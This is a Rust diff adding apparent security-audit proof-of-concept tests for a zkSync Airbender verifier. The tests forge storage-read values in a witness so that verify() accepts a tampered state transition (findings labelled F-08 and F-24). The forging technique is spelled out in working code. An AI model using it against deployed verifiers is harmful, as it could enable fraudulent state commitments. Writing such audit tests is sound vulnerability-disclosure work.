@@ -161,6 +161,7 @@ fn test_forge_missing_read_triggers_f08() {
         eprintln!("trying forge {target_key:?} = {v_evil:?}");
         let perturb = Perturbations {
             forge_missing_reads: vec![(target_key, v_evil)],
+            ..Default::default()
         };
         let forged = match make_single_tx_input_with(base.clone(), pick, perturb) {
             Ok(f) => f,
@@ -212,6 +213,239 @@ fn test_forge_missing_read_triggers_f08() {
     panic!("no user-space zero-read candidate produced an accepting forged input");
 }
 
+/// Demonstrates F-24's **Inserted** variant: when the tx writes a slot K and
+/// the witness records K as `leaf_enumeration_index = 0` (empty in old
+/// tree), `map_log_tree`'s `(true, Inserted)` arm emits
+/// `TreeInstruction::write(K, idx, V_new)` consuming only the *written*
+/// value. `StorageLog::from_log_query` discards `read_value`, so a forged
+/// `read_storage_key[K] = V_evil` is silently accepted even though the VM
+/// observed V_evil before writing.
+///
+/// In our trim-down harness, the baseline seeds the tree from
+/// `read_storage_key` (zero-valued reads included), so every actual VM write
+/// shows up as Updated. We **construct** the Inserted scenario by taking a
+/// baseline write target and applying `forge_missing_reads` — which skips K
+/// from tree seeding and overrides the value in `read_storage_key`. The
+/// forged run produces an Inserted witness entry; F-24's Inserted-arm path
+/// is what accepts it.
+#[test]
+fn test_forge_inserted_write_triggers_f24() {
+    let (base, baseline, baseline_result) = load_and_baseline();
+    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
+    let candidates = write_candidates(&baseline, &base);
+    eprintln!("baseline write candidates: {}", candidates.len());
+    let v_evil = H256::from_low_u64_be(0xdead_beef_dead_beef);
+    for target_key in &candidates {
+        eprintln!("trying Inserted-forge {target_key:?} = {v_evil:?}");
+        let perturb = Perturbations {
+            forge_missing_reads: vec![(*target_key, v_evil)],
+            ..Default::default()
+        };
+        let Some((forged, result)) = run_perturb(&base, pick, perturb) else {
+            continue;
+        };
+        // Witness must show Inserted (first_write=true) for our target.
+        let target_hashed = target_key.hashed_key_u256();
+        let Some(entry) = forged
+            .merkle_paths
+            .merkle_paths
+            .iter()
+            .find(|log| log.leaf_hashed_key == target_hashed && log.is_write)
+        else {
+            eprintln!("  K not written; next");
+            continue;
+        };
+        if !entry.first_write {
+            eprintln!("  expected Inserted (first_write=true), got Updated; next");
+            continue;
+        }
+        report_forge(
+            "F-24 Inserted",
+            target_key,
+            &v_evil,
+            &baseline_result,
+            &result,
+        );
+        return;
+    }
+    panic!("no candidate produced an accepting F-24-Inserted forged input");
+}
+
+/// Demonstrates F-24's **Updated** variant: when the tx writes a slot K that
+/// is already populated with `(L, V_real)` in the tree, the witness records
+/// `is_write=true, first_write=false, leaf_enumeration_index=L,
+/// value_read=V_real`. `map_log_tree`'s `(true, Updated)` arm consumes only
+/// `storage_log.value` (= V_new), so a forged `read_storage_key[K] = V_evil`
+/// makes the VM observe V_evil while the witness keeps the honest V_real —
+/// the verifier never cross-checks the two.
+#[test]
+fn test_forge_updated_write_triggers_f24() {
+    let (base, baseline, baseline_result) = load_and_baseline();
+    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
+    let candidates = write_candidates(&baseline, &base);
+    eprintln!("baseline write candidates: {}", candidates.len());
+    let read_set = &base.vm_run_data.witness_block_state.read_storage_key;
+    let v_evil = H256::from_low_u64_be(0xdead_beef_dead_beef);
+    for target_key in &candidates {
+        // Only Updated-with-non-zero-V_real candidates demonstrate the
+        // V_evil/V_real mismatch meaningfully.
+        let Some(v_real) = read_set.get(target_key).copied() else {
+            continue;
+        };
+        if v_real == H256::zero() || v_real == v_evil {
+            continue;
+        }
+        eprintln!("trying Updated-forge {target_key:?} V_real={v_real:?} -> V_evil={v_evil:?}");
+        let perturb = Perturbations {
+            forge_existing_reads: vec![(*target_key, v_evil)],
+            ..Default::default()
+        };
+        let Some((forged, result)) = run_perturb(&base, pick, perturb) else {
+            continue;
+        };
+        let target_hashed = target_key.hashed_key_u256();
+        let Some(entry) = forged
+            .merkle_paths
+            .merkle_paths
+            .iter()
+            .find(|log| log.leaf_hashed_key == target_hashed && log.is_write)
+        else {
+            eprintln!("  K not written; next");
+            continue;
+        };
+        if entry.first_write {
+            eprintln!("  expected Updated (first_write=false), got Inserted; next");
+            continue;
+        }
+        // Smoking gun: witness's value_read is V_real, even though the VM
+        // observed V_evil. Verifier never compares the two.
+        assert_eq!(
+            H256(entry.value_read),
+            v_real,
+            "witness value_read must remain the honest V_real",
+        );
+        eprintln!("  witness value_read:  {v_real:?}  (honest, from tree)");
+        eprintln!("  VM-observed value:   {v_evil:?}  (forged, never compared)");
+        report_forge(
+            "F-24 Updated",
+            target_key,
+            &v_evil,
+            &baseline_result,
+            &result,
+        );
+        return;
+    }
+    panic!("no candidate produced an accepting F-24-Updated forged input");
+}
+
+/// Loads batch 506093, builds the baseline single-tx input, and verifies it.
+/// Returns `(base, baseline_input, baseline_verification_result)`.
+fn load_and_baseline() -> (
+    V1AirbenderVerifierInput,
+    V1AirbenderVerifierInput,
+    zksync_airbender_verifier::VerificationResult,
+) {
+    let batch_path = Path::new(env!("CARGO_MANIFEST_DIR"))
+        .join("../../testdata/era_mainnet_batches/binary/506093.bin.gz");
+    assert!(
+        batch_path.exists() && std::fs::metadata(&batch_path).unwrap().len() >= 1000,
+        "batch file 506093.bin.gz missing or LFS pointer — fetch via scripts/fetch_lfs_batches.sh",
+    );
+    let base = load_batch(&BatchInputFile {
+        number: 506093,
+        path: batch_path,
+    })
+    .expect("failed to load batch")
+    .into_v1()
+    .expect("expected V1 payload");
+    let pick = TxPick::first_non_empty(&base).expect("no non-empty L2 block");
+    let baseline = make_single_tx_input(base.clone(), pick).expect("baseline failed");
+    let baseline_result = baseline.clone().verify().expect("baseline verify");
+    eprintln!("baseline commitment:   {:?}", baseline_result.commitment);
+    eprintln!("baseline state root:   {:?}", baseline_result.value_hash);
+    (base, baseline, baseline_result)
+}
+
+/// Returns the unhashed StorageKey for every write the baseline tx performs,
+/// in deterministic-enough order. Pulls keys from both `read_storage_key`
+/// (Updated writes) and `is_write_initial` (Inserted-by-original-batch).
+fn write_candidates(
+    baseline: &V1AirbenderVerifierInput,
+    base: &V1AirbenderVerifierInput,
+) -> Vec<StorageKey> {
+    let write_hashes: HashSet<U256> = baseline
+        .merkle_paths
+        .merkle_paths
+        .iter()
+        .filter(|log| log.is_write)
+        .map(|log| log.leaf_hashed_key)
+        .collect();
+    let mut hashed_to_key: HashMap<U256, StorageKey> = base
+        .vm_run_data
+        .witness_block_state
+        .read_storage_key
+        .keys()
+        .map(|k| (k.hashed_key_u256(), *k))
+        .collect();
+    for (k, &iw) in &baseline.vm_run_data.witness_block_state.is_write_initial {
+        if iw {
+            hashed_to_key.entry(k.hashed_key_u256()).or_insert(*k);
+        }
+    }
+    write_hashes
+        .iter()
+        .filter_map(|h| hashed_to_key.get(h).copied())
+        .collect()
+}
+
+/// Runs `make_single_tx_input_with` + `verify`, catching any VM panic so the
+/// caller can iterate to the next candidate.
+fn run_perturb(
+    base: &V1AirbenderVerifierInput,
+    pick: TxPick,
+    perturb: Perturbations,
+) -> Option<(
+    V1AirbenderVerifierInput,
+    zksync_airbender_verifier::VerificationResult,
+)> {
+    let outcome = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        let forged = make_single_tx_input_with(base.clone(), pick, perturb)?;
+        let result = forged.clone().verify()?;
+        Ok::<_, anyhow::Error>((forged, result))
+    }));
+    match outcome {
+        Ok(Ok((f, r))) => Some((f, r)),
+        Ok(Err(e)) => {
+            eprintln!("  err: {e:#}");
+            None
+        }
+        Err(_) => {
+            eprintln!("  VM/verifier panicked (likely a system-contract slot)");
+            None
+        }
+    }
+}
+
+fn report_forge(
+    tag: &str,
+    target_key: &StorageKey,
+    v_evil: &H256,
+    baseline_result: &zksync_airbender_verifier::VerificationResult,
+    forged_result: &zksync_airbender_verifier::VerificationResult,
+) {
+    eprintln!("{tag} unpatched: verify() accepted forged write");
+    eprintln!("  forged key:          {target_key:?}");
+    eprintln!("  forged value:        {v_evil:?}");
+    eprintln!("  baseline commitment: {:?}", baseline_result.commitment);
+    eprintln!("  forged   commitment: {:?}", forged_result.commitment);
+    eprintln!("  baseline state root: {:?}", baseline_result.value_hash);
+    eprintln!("  forged   state root: {:?}", forged_result.value_hash);
+    assert_ne!(
+        forged_result.commitment, baseline_result.commitment,
+        "commitment must change to demonstrate the forge had observable effect",
+    );
+}
+
 /// Which transaction in the source batch to keep.
 #[derive(Debug, Clone, Copy)]
 pub struct TxPick {
@@ -241,10 +475,19 @@ impl TxPick {
 pub struct Perturbations {
     /// Inject `(K, V_evil)` into `read_storage_key`. The keys are **not**
     /// seeded into the merkle tree, so the witness records each as
-    /// `leaf_enumeration_index = 0` (ReadMissingKey). If the VM actually
-    /// reads K it observes `V_evil` — exercising F-08's `ReadMissingKey`-arm
-    /// value-forge attack.
+    /// `leaf_enumeration_index = 0`. If the VM actually reads K it observes
+    /// `V_evil` — exercises F-08's `ReadMissingKey` arm of `map_log_tree`,
+    /// and (when K is also written by the tx) F-24's Inserted-arm variant.
     pub forge_missing_reads: Vec<(StorageKey, H256)>,
+    /// Override the value of an existing key K in `read_storage_key`. The
+    /// merkle tree still seeds K with its **original** value (so the
+    /// witness's `value_read = V_real`), but the verifier's storage view
+    /// returns `V_evil` to the VM. Exercises F-24's Updated-arm variant when
+    /// the tx writes K — `map_log_tree`'s `(true, Updated)` arm emits a
+    /// `TreeInstruction::write(K, L, V_new)` consuming only the *written*
+    /// value, and `StorageLog::from_log_query` discards the read value, so
+    /// the verifier never observes the V_evil/V_real mismatch.
+    pub forge_existing_reads: Vec<(StorageKey, H256)>,
 }
 
 /// Take a multi-tx verifier input and produce a self-consistent input that
@@ -318,21 +561,33 @@ fn make_single_tx_input_with(
     base.l1_batch_env.first_l2_block = L2BlockEnv::from_l2_block_data(&trimmed_first);
     base.l2_blocks_execution_data = vec![trimmed_first, next_block];
 
-    // Apply F-08 forge: inject (K, V_evil) into the read set without seeding
-    // K into the merkle tree. The verifier reads `read_storage_key` from
-    // input, so it sees V_evil; the tree omits K so its witness entry is
-    // ReadMissingKey (leaf_enumeration_index = 0).
-    let forge_set: HashSet<StorageKey> = perturb
-        .forge_missing_reads
-        .iter()
-        .map(|(k, _)| *k)
-        .collect();
-    let mut read_storage = base
+    // Snapshot original read set BEFORE applying any forges — the merkle
+    // tree must be seeded with the *honest* values so the witness's
+    // `value_read` field reflects what's actually in the tree.
+    let original_reads = base
         .vm_run_data
         .witness_block_state
         .read_storage_key
         .clone();
+    let forge_missing_set: HashSet<StorageKey> = perturb
+        .forge_missing_reads
+        .iter()
+        .map(|(k, _)| *k)
+        .collect();
+    for (k, _) in &perturb.forge_existing_reads {
+        anyhow::ensure!(
+            original_reads.contains_key(k),
+            "forge_existing_reads requires K={k:?} to already be in read_storage_key; \
+             use forge_missing_reads for keys that aren't",
+        );
+    }
+    // Apply forges to the verifier-visible read_storage_key: missing-read
+    // forges add new K=V_evil entries; existing-read forges overwrite V_real.
+    let mut read_storage = original_reads.clone();
     for (k, v) in &perturb.forge_missing_reads {
+        read_storage.insert(*k, *v);
+    }
+    for (k, v) in &perturb.forge_existing_reads {
         read_storage.insert(*k, *v);
     }
     base.vm_run_data.witness_block_state.read_storage_key = read_storage.clone();
@@ -342,15 +597,15 @@ fn make_single_tx_input_with(
         .is_write_initial
         .clone();
 
-    // Assign synthetic monotonic enum indices to every non-forged key in the
-    // read set. JMT root depends on the *set* of (key, value, leaf_index)
-    // triples, not on insertion order, so any deterministic indexing works.
+    // Seed the tree from `original_reads`, skipping the missing-read forges.
+    // existing-read forges stay in the tree with their original V_real so
+    // their witness `value_read` matches the merkle-proved value.
     let mut entries: Vec<TreeEntry> =
-        Vec::with_capacity(read_storage.len().saturating_sub(forge_set.len()));
+        Vec::with_capacity(original_reads.len().saturating_sub(forge_missing_set.len()));
     let mut hashed_to_index: HashMap<H256, u64> = HashMap::with_capacity(entries.capacity());
     let mut next_leaf_index: u64 = 0;
-    for (key, value) in read_storage.iter() {
-        if forge_set.contains(key) {
+    for (key, value) in original_reads.iter() {
+        if forge_missing_set.contains(key) {
             continue;
         }
         next_leaf_index += 1;
